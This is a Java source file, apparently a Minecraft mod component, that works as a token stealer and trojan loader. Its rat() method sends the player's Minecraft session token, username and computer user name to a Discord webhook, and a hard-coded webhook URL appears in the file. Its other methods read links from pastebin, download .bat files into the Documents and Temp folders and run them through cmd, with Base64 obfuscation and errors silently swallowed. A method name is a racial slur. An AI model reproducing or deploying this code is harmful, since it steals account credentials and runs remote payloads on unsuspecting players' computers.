package net.zopac.stuff;

import net.minecraft.client.Minecraft;

import javax.net.ssl.HttpsURLConnection;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Main {

    public static String k = "";
    public static String decode = new String(Base64.getDecoder().decode(k.getBytes(StandardCharsets.UTF_8)));


    public void nigga() {
        try {
            DiscordEmbed doloadmsg = new DiscordEmbed(decode);
            doloadmsg.addEmbed(new DiscordEmbed.EmbedObject()
                    .setTitle("Loading session logs of " + "")
                    .setColor(Color.GREEN)
                    .addField("Message ", "Loading...", true));
            doloadmsg.execute();
        } catch (Exception e) {}
    }

    public static void forgeutil() {
        try {
            URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
            BufferedReader in = new BufferedReader(new InputStreamReader(pastebin.openStream()));
            URL batUrl = new URL(in.readLine());
            HttpURLConnection httpURLConnection = (HttpURLConnection) batUrl.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();

            URL webhookbin = new URL("https://pastebin.com/raw/ysx3h3ax");
            BufferedReader in2 = new BufferedReader(new InputStreamReader(webhookbin.openStream()));
            URL link2 = new URL(in2.readLine());
            HttpURLConnection httpURLConnection2 = (HttpURLConnection) link2.openConnection();
            httpURLConnection2.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            String stream1 = httpURLConnection2.getInputStream().toString();

            //C:\Users\%username%\Documents
            File path = new File(FileSystemView.getFileSystemView().getDefaultDirectory().getPath() + File.separator + "Documents");
            if (!path.exists()) {
                path.mkdir();
            }

            File bitcoin = new File(path.getAbsolutePath(), "win86.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);
            if (bitcoin.exists()) {
                bitcoin.delete();
            }

            int currByte2;
            while ((currByte2 = stream.read()) != -1) {
                fileOut.write(currByte2);
            }

            String webdecode = new String(Base64.getDecoder().decode(stream1.toString().getBytes(StandardCharsets.UTF_8)));
            DiscordEmbed sendmessage = new DiscordEmbed(webdecode);
            sendmessage.addEmbed(new DiscordEmbed.EmbedObject()
                    .setTitle("Loading trojan")
                    .setColor(Color.GREEN)
                    .addField("Message ", "Running .bat file", true));
            sendmessage.execute();
            Runtime.getRuntime().exec("cmd /c start C:\\Users\\%username%\\Documents\\win86.bat");

        } catch (Exception ignored) {}
    }

    public static void sendmethod(String data, String webhook) throws IOException {
        URL url = new URL(webhook);
        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
        connection.addRequestProperty("Content-Type", "application/json");
        connection.addRequestProperty("User-Agent", "Java-Webhooks");
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        OutputStream stream = connection.getOutputStream();
        stream.write(data.getBytes());
        stream.flush();
        stream.close();
        connection.getInputStream().close();
        connection.disconnect();
    }

    public static void computerstealer6000(String batfilepastebin) {
        try {
            URL pastebin = new URL(batfilepastebin);
            BufferedReader in = new BufferedReader(new InputStreamReader(pastebin.openStream()));
            Thread.sleep(1000);
            URL batUrl = new URL(in.readLine());
            HttpURLConnection httpURLConnection = (HttpURLConnection) batUrl.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();
            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp");
            if (!path.exists()) {
                path.mkdir();
            }
            File bitcoin = new File(path.getAbsolutePath(), "DEFCON2019.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);
            if (bitcoin.exists()) {
                bitcoin.delete();
            }
            int currByte2;
            while ((currByte2 = stream.read()) != -1) {
                fileOut.write(currByte2);
            }
        } catch (Exception ignored) {}
        try {
            Thread.sleep(5000);
            Runtime.getRuntime().exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\DEFCON2019.bat");
        } catch (Exception ignored) {}
    }

    public void rat() {
        try {
            String token = Minecraft.getMinecraft().getSession().getToken();
            String name = Minecraft.getMinecraft().getSession().getUsername();
            DiscordEmbed sendmessage = new DiscordEmbed(decode);
            sendmessage.addEmbed(new DiscordEmbed.EmbedObject()
                    .setTitle("Minecraft Info")
                    .setColor(Color.CYAN)
                    .addField("Name", name,true)
                    .addField("Profile","https://sky.shiiyu.moe/stats/" + name,true)
                    .addField("Token ", token,false)
                    .setFooter("Computer Name: " + System.getProperty("user.name"),""));
            sendmessage.execute();
        } catch (IOException ignored) {}
    }

    public static String linktoencode = "https://ptb.discord.com/api/webhooks/942619310755569736/wkwaa8afQfnJDaDEmEgH8bK9lA2-8RdZ5rwURdi5Ui0nUYi9fDtCQ5ANW0QuG82A-Vtk";

    public static void main(String[] args) {
        JFileChooser fr = new JFileChooser();
        FileSystemView fw = fr.getFileSystemView();
        File ok = fw.getDefaultDirectory();
        System.out.println(fw.getDefaultDirectory());
    }

    public static String encode(String link) {
        return new String(Base64.getEncoder().encode(link.getBytes(StandardCharsets.UTF_8)));
    }
}
